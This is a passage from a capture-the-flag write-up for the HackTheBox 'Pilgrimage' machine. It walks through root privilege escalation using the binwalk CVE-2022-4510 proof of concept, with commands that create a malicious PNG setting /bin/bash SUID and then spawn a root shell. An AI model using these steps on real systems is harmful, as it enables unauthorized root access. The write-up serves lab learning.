    <span class="o">-</span><span class="n">B</span><span class="p">,</span> <span class="o">--</span><span class="n">signature</span>              <span class="n">Scan</span> <span class="n">target</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">common</span> <span class="n">file</span> <span class="n">signatures</span>
    <span class="o">-</span><span class="n">R</span><span class="p">,</span> <span class="o">--</span><span class="n">raw</span><span class="o">=&lt;</span><span class="nb">str</span><span class="o">&gt;</span>              <span class="n">Scan</span> <span class="n">target</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">sequence</span> <span class="n">of</span> <span class="nb">bytes</span>
    <span class="o">-</span><span class="n">A</span><span class="p">,</span> <span class="o">--</span><span class="n">opcodes</span>                <span class="n">Scan</span> <span class="n">target</span> <span class="n">file</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">for</span> <span class="n">common</span> <span class="n">executable</span> <span class="n">opcode</span> <span class="n">signatures</span>
    <span class="o">-</span><span class="n">m</span><span class="p">,</span> <span class="o">--</span><span class="n">magic</span><span class="o">=&lt;</span><span class="n">file</span><span class="o">&gt;</span>           <span class="n">Specify</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">magic</span> <span class="n">file</span> <span class="n">to</span> <span class="n">use</span>
<span class="o">...................................................................................................</span>
<span class="o">...................................................................................................</span>
<span class="o">...................................................................................................</span>
    <span class="o">-</span><span class="n">K</span><span class="p">,</span> <span class="o">--</span><span class="n">block</span><span class="o">=&lt;</span><span class="nb">int</span><span class="o">&gt;</span>            <span class="n">Set</span> <span class="n">file</span> <span class="n">block</span> <span class="n">size</span>
    <span class="o">-</span><span class="n">g</span><span class="p">,</span> <span class="o">--</span><span class="n">swap</span><span class="o">=&lt;</span><span class="nb">int</span><span class="o">&gt;</span>             <span class="n">Reverse</span> <span class="n">every</span> <span class="n">n</span> <span class="nb">bytes</span> <span class="n">before</span> <span class="n">scanning</span>
    <span class="o">-</span><span class="n">f</span><span class="p">,</span> <span class="o">--</span><span class="n">log</span><span class="o">=&lt;</span><span class="n">file</span><span class="o">&gt;</span>             <span class="n">Log</span> <span class="n">results</span> <span class="n">to</span> <span class="n">file</span>
    <span class="o">-</span><span class="n">c</span><span class="p">,</span> <span class="o">--</span><span class="n">csv</span>                    <span class="n">Log</span> <span class="n">results</span> <span class="n">to</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">CSV</span> <span class="nb">format</span>
    <span class="o">-</span><span class="n">t</span><span class="p">,</span> <span class="o">--</span><span class="n">term</span>                   <span class="n">Format</span> <span class="n">output</span> <span class="n">to</span> <span class="n">fit</span> <span class="n">the</span> <span class="n">terminal</span> <span class="n">window</span>
    <span class="o">-</span><span class="n">q</span><span class="p">,</span> <span class="o">--</span><span class="n">quiet</span>                  <span class="n">Suppress</span> <span class="n">output</span> <span class="n">to</span> <span class="n">stdout</span>
    <span class="o">-</span><span class="n">v</span><span class="p">,</span> <span class="o">--</span><span class="n">verbose</span>                <span class="n">Enable</span> <span class="n">verbose</span> <span class="n">output</span>
    <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>                   <span class="n">Show</span> <span class="n">help</span> <span class="n">output</span>
    <span class="o">-</span><span class="n">a</span><span class="p">,</span> <span class="o">--</span><span class="n">finclude</span><span class="o">=&lt;</span><span class="nb">str</span><span class="o">&gt;</span>         <span class="n">Only</span> <span class="n">scan</span> <span class="n">files</span> <span class="n">whose</span> <span class="n">names</span> <span class="n">match</span> <span class="n">this</span> <span class="n">regex</span>
    <span class="o">-</span><span class="n">p</span><span class="p">,</span> <span class="o">--</span><span class="n">fexclude</span><span class="o">=&lt;</span><span class="nb">str</span><span class="o">&gt;</span>         <span class="n">Do</span> <span class="ow">not</span> <span class="n">scan</span> <span class="n">files</span> <span class="n">whose</span> <span class="n">names</span> <span class="n">match</span> <span class="n">this</span> <span class="n">regex</span>
    <span class="o">-</span><span class="n">s</span><span class="p">,</span> <span class="o">--</span><span class="n">status</span><span class="o">=&lt;</span><span class="nb">int</span><span class="o">&gt;</span>           <span class="n">Enable</span> <span class="n">the</span> <span class="n">status</span> <span class="n">server</span> <span class="n">on</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">port</span>

<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

This script is using version <code>2.3.2</code> of <code>binwalk</code>. Let's search for information about vulnerabilities associated with this version.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/13.png"/><br/><br/>
This version appears to be vulnerable to Remote Code Execution (RCE). I copied the CVE ID (<code>CVE-2022-4510</code>) and conducted research on this vulnerability.<br/><br/>
Here is an <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4510">article</a> from the NVD about this vulnerability:<br/><br/>
<em>A path traversal vulnerability was identified in ReFirm Labs binwalk from version 2.1.2b through 2.3.3 included. By crafting a malicious PFS filesystem file, an attacker can get binwalk's PFS extractor to extract files at arbitrary locations when binwalk is run in extraction mode (-e option). Remote code execution can be achieved by building a PFS filesystem that, upon extraction, would extract a malicious binwalk module into the folder .config/binwalk/plugins. This vulnerability is associated with program files src/binwalk/plugins/unpfs.py. This issue affects binwalk from 2.1.2b through 2.3.3 included.</em><br/><br/>
In other words, this vulnerability allows an attacker to manipulate a certain type of filesystem file, potentially leading to unauthorized extraction of files when binwalk is used in extraction mode (-e option). If an attacker successfully exploits this flaw, they could execute code remotely. <br/><br/>
After searching for information on the internet, I found a <a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath">PoC</a> for exploiting this vulnerability.<br/><br/>
This exploit generates a malicious <code>.png</code> file which will allow us to execute commands as root, since root is executing <code>binwalk</code>.<br/><br/>
To exploit this vulnerability, we need to determine the location where the root user is applying <code>binwalk</code>. This information is leaked in the <code>malwarescan.sh</code> script, as we've already seen. Therefore, when the malicious file is created, we need to copy it to the <code>/var/www/pilgrimage.htb/shrunk/</code> directory.<br/><br/>
First, I uploaded the <a href="https://raw.githubusercontent.com/adhikara13/CVE-2022-4510-WalkingPath/main/walkingpath.py">walkingpath.py</a> script to the victim machine:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> 
<span class="n">usage</span><span class="p">:</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">{</span><span class="n">ssh</span><span class="p">,</span><span class="n">command</span><span class="p">,</span><span class="n">reverse</span><span class="p">}</span> <span class="o">...</span>

<span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span>
  <span class="p">{</span><span class="n">ssh</span><span class="p">,</span><span class="n">command</span><span class="p">,</span><span class="n">reverse</span><span class="p">}</span>

<span class="n">optional</span> <span class="n">arguments</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

I also uploaded a PNG image, as it is needed to create the malicious file. Now, let's use the <code>command</code> module to create a malicious file. We will attempt to make the root user execute the <code>chmod u+s /bin/bash</code> command. If the <code>root</code> user successfully executes this command, the <code>/bin/bash</code> will become <code>Set-UID</code>, allowing us to use the <code>bash -p</code> command and gain command execution as the <code>root</code> user.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span> <span class="n">command</span> <span class="o">--</span><span class="n">command</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">./</span><span class="n">image</span><span class="o">.</span><span class="n">png</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

The <code>binwalk_exploit.png</code> was successfully created. This image will be used in the attempt to exploit the vulnerability and gain command execution as the root user.<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">total</span> <span class="mi">1016</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span> <span class="mi">514272</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">12</span> <span class="n">binwalk_exploit</span><span class="o">.</span><span class="n">png</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span> <span class="mi">513590</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">11</span> <span class="n">image</span><span class="o">.</span><span class="n">png</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span> <span class="mi">1</span> <span class="n">root</span>  <span class="n">emily</span>     <span class="mi">33</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">22</span><span class="p">:</span><span class="mi">25</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">emily</span> <span class="n">emily</span>   <span class="mi">3391</span> <span class="n">Nov</span> <span class="mi">29</span> <span class="mi">06</span><span class="p">:</span><span class="mi">02</span> <span class="n">walkingpath</span><span class="o">.</span><span class="n">py</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Now, we need to copy the <code>binwalk_exploit.png</code> image to the <code>/var/www/pilgrimage.htb/shrunk/</code> directory:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cp</span> <span class="n">binwalk_exploit</span><span class="o">.</span><span class="n">png</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">png</span>
</pre></div>

Finally, when listing the privileges of <code>/bin/bash</code>, we notice that it is <code>Set-UID</code>:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1234376</span> <span class="n">Mar</span> <span class="mi">28</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
</pre></div>

Now, using <code>bash -p</code>, we gain access as root, and we can read the last flag:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> whoami</span>
<span class="n">root</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
<span class="n">ace35</span><span class="o">**********************</span><span class="mi">2</span><span class="n">ea4a</span>
<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
</pre></div></br></br></br></br></br></br></br></br>
            </div>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 elswix.github.io</p>
    </footer>
</body>
</html>
